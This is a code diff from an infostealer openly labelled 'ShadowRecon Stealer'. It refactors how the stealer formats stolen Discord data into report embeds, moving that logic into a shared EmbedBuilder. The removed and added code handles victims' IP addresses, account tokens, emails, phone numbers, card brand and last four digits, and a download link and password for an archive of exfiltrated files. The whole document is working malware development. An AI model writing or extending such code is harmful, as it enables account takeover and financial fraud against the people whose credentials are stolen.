@@ -14,6 +14,7 @@ const { ErrorHandler, NetworkError, ModuleError } = require('../../core/errors')
 const { fileManager } = require('../../core/fileManager');
 const { stats } = require('../../core/statistics');
 const { TokenUtils } = require('../../core/tokenUtils');
+const { EmbedBuilder } = require('../../core/embedBuilder');
 const { DiscordBrowserService } = require('./browserService');
 const config = require('../../config/config');
 
@@ -497,76 +498,7 @@ This file indicates that the Discord module found tokens but couldn't process th
      * @returns {Object} Discord embed
      */
     createAccountEmbed(account, ip = 'Unknown') {
-        // Format billing information
-        const billing = account.billings && account.billings.length > 0 ? 
-            account.billings.map(b => `${b.brand} *${b.last4}`).join(', ') : 
-            'None';
-        
-        // Format badges
-        const badges = account.badges && account.badges.length > 0 ? 
-            account.badges.join(', ') : 
-            'None';
-        
-        // Format avatar URL
-        const avatarUrl = account.avatar ? 
-            `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp` : 
-            `https://cdn.discordapp.com/embed/avatars/0.png`;
-        
-        return {
-            color: null,
-            fields: [
-                {
-                    name: ":earth_africa: IP",
-                    value: `\`${ip}\``,
-                    inline: true
-                },
-                {
-                    name: ":mag_right: Username",
-                    value: `\`${account.username}\``,
-                    inline: true
-                },
-                {
-                    name: ":gem: Token",
-                    value: `\`${account.token}\``
-                },
-                {
-                    name: ":e_mail: Email",
-                    value: `\`${account.email || 'N/A'}\``,
-                    inline: true
-                },
-                {
-                    name: ":mobile_phone: Phone",
-                    value: `\`${account.phone || 'N/A'}\``,
-                    inline: true
-                },
-                {
-                    name: ":credit_card: Billing",
-                    value: `\`${billing}\``,
-                    inline: true
-                },
-                {
-                    name: ":money_with_wings: Nitro",
-                    value: `\`${account.nitro || 'None'}\``,
-                    inline: true
-                },
-                {
-                    name: ":package: Badges",
-                    value: `\`${badges}\``,
-                    inline: true
-                }
-            ],
-            author: {
-                name: `${account.username} (${account.id})`,
-                icon_url: avatarUrl
-            },
-            footer: {
-                text: "ShadowRecon Stealer"
-            },
-            timestamp: new Date().toISOString(),
-            thumbnail: {
-                url: avatarUrl
-            }
-        };
+        return EmbedBuilder.createAccountEmbed(account, ip);
     }
 
     /**
@@ -615,46 +547,11 @@ This file indicates that the Discord module found tokens but couldn't process th
             
             // Add file information embed if upload result is available or if password-protected locally
             if ((uploadResult && uploadResult.downloadUrl) || zipPassword) {
-                const fileEmbed = {
-                    title: ":file_folder: Data Archive",
-                    color: 0x7289da,
-                    fields: [],
-                    footer: {
-                        text: "ShadowRecon Stealer - Archive"
-                    },
-                    timestamp: new Date().toISOString()
-                };
-
-                // Add download link if available
-                if (uploadResult && uploadResult.downloadUrl) {
-                    fileEmbed.fields.push({
-                        name: ":link: Download Link",
-                        value: `[Click here to download](${uploadResult.downloadUrl})`,
-                        inline: false
-                    });
-                } else if (zipPassword) {
-                    fileEmbed.fields.push({
-                        name: ":package: Local Archive",
-                        value: `Archive created locally with password protection`,
-                        inline: false
-                    });
-                }
-
-                // Add password field if available (from upload result or local zip)
-                const password = (uploadResult && uploadResult.password) || zipPassword;
-                if (password) {
-                    fileEmbed.fields.push({
-                        name: ":key: Archive Password",
-                        value: `\`${password}\``,
-                        inline: false
-                    });
-                    fileEmbed.fields.push({
-                        name: ":warning: Important",
-                        value: "This archive is password protected. Use the password above to extract the contents.",
-                        inline: false
-                    });
-                }
-
+                const fileEmbed = EmbedBuilder.createFileEmbed(
+                    ip,
+                    uploadResult ? uploadResult.downloadUrl : null,
+                    (uploadResult && uploadResult.password) || zipPassword
+                );
                 embeds.push(fileEmbed);
             }
             
